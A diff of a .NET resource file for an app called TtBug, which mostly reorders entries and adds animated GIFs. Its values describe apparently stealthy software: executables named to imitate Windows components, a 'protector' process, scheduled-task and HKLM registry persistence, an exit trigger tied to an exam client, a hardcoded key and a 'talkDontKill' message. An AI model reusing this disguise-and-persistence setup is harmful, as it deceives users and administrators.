@@ -117,81 +117,39 @@
   <resheader name="writer">
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
-  <data name="appName" xml:space="preserve">
-    <value>TtBugManager</value>
-  </data>
-  <data name="appPath" xml:space="preserve">
-    <value>TtBug.exe</value>
-  </data>
-  <data name="callerPath" xml:space="preserve">
-    <value>sdiageng.exe</value>
-  </data>
-  <data name="protectorPath" xml:space="preserve">
-    <value>igconfig.exe</value>
-  </data>
-  <data name="savedPath" xml:space="preserve">
-    <value>ddptrace.exe</value>
-  </data>
-  <data name="tasksPath" xml:space="preserve">
-    <value>schtasks.exe</value>
-  </data>
-  <data name="updatePath" xml:space="preserve">
-    <value>igupdate.exe</value>
-  </data>
-  <data name="xmlPath" xml:space="preserve">
-    <value>mmcshext.xml</value>
-  </data>
-  <data name="allowComputers" xml:space="preserve">
-    <value>TRANGNTMSB60441,TUANBTSE60824</value>
-  </data>
-  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
-  <data name="talkDontKill" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\talkDontKill.txt;System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
-  </data>
-  <data name="talkGoodNight" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\talkGoodNight.txt;System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
-  </data>
-  <data name="talkSentences" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\talkSentences.txt;System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
-  </data>
-  <data name="exitWith" xml:space="preserve">
-    <value>ExamClientV4</value>
-  </data>
-  <data name="protectorName" xml:space="preserve">
-    <value>igconfig</value>
-  </data>
-  <data name="regApp" xml:space="preserve">
-    <value>HKEY_LOCAL_MACHINE\SOFTWARE\TtBug</value>
-  </data>
   <data name="regAppName" xml:space="preserve">
     <value>TtBug</value>
   </data>
   <data name="regAppSubKey" xml:space="preserve">
     <value>SOFTWARE\TtBug</value>
   </data>
-  <data name="myhash" xml:space="preserve">
-    <value>h82n9s31njasiw8</value>
+  <data name="updatePath" xml:space="preserve">
+    <value>igupdate.exe</value>
   </data>
-  <data name="mykey" xml:space="preserve">
-    <value>xHas7PDA89kM</value>
+  <data name="protectorPath" xml:space="preserve">
+    <value>igconfig.exe</value>
   </data>
-  <data name="theup" xml:space="preserve">
-    <value>C:\Windows\Logs\ProcessMemoryEvents.exe</value>
-  </data>
-  <data name="realSystemFile" xml:space="preserve">
-    <value>rundll32.exe</value>
-  </data>
-  <data name="regDate" xml:space="preserve">
-    <value>TtBugDay</value>
-  </data>
-  <data name="taPath" xml:space="preserve">
-    <value>Tasks\TtBugManager</value>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="Heart" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Heart.gif;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="talkGoodBye" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\talkGoodBye.txt;System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
   </data>
-  <data name="talkGoodNight2" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\talkGoodNight2.txt;System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  <data name="regApp" xml:space="preserve">
+    <value>HKEY_LOCAL_MACHINE\SOFTWARE\TtBug</value>
+  </data>
+  <data name="tasksPath" xml:space="preserve">
+    <value>schtasks.exe</value>
+  </data>
+  <data name="taPath" xml:space="preserve">
+    <value>Tasks\TtBugManager</value>
+  </data>
+  <data name="talkSentences" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\talkSentences.txt;System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="realSystemFile" xml:space="preserve">
+    <value>rundll32.exe</value>
   </data>
   <data name="talkSentences2" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\talkSentences2.txt;System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
@@ -199,16 +157,65 @@
   <data name="chickenA1" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\chickenA1.gif;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
+  <data name="mykey" xml:space="preserve">
+    <value>xHas7PDA89kM</value>
+  </data>
+  <data name="talkGoodNight" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\talkGoodNight.txt;System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="regDate" xml:space="preserve">
+    <value>TtBugDay</value>
+  </data>
+  <data name="savedPath" xml:space="preserve">
+    <value>ddptrace.exe</value>
+  </data>
+  <data name="callerPath" xml:space="preserve">
+    <value>sdiageng.exe</value>
+  </data>
+  <data name="theup" xml:space="preserve">
+    <value>C:\Windows\Logs\ProcessMemoryEvents.exe</value>
+  </data>
+  <data name="exitWith" xml:space="preserve">
+    <value>ExamClientV4</value>
+  </data>
+  <data name="allowComputers" xml:space="preserve">
+    <value>TRANGNTMSB60441,TUANBTSE60824</value>
+  </data>
+  <data name="appName" xml:space="preserve">
+    <value>TtBugManager</value>
+  </data>
+  <data name="xmlPath" xml:space="preserve">
+    <value>mmcshext.xml</value>
+  </data>
+  <data name="talkGoodNight2" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\talkGoodNight2.txt;System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="myhash" xml:space="preserve">
+    <value>h82n9s31njasiw8</value>
+  </data>
+  <data name="protectorName" xml:space="preserve">
+    <value>igconfig</value>
+  </data>
+  <data name="appPath" xml:space="preserve">
+    <value>TtBug.exe</value>
+  </data>
   <data name="chickenA2" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\chickenA2.gif;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
-  </data>
-  <data name="Heart" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Heart.gif;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="lion1" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\lion1.gif;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="lion2" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\lion2.gif;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="hatching_chicken_in_love" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\hatching-chicken-in-love.gif;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="talkDontKill" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\talkDontKill.txt;System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="heart_liebe" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\heart_liebe.gif;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
 </root>
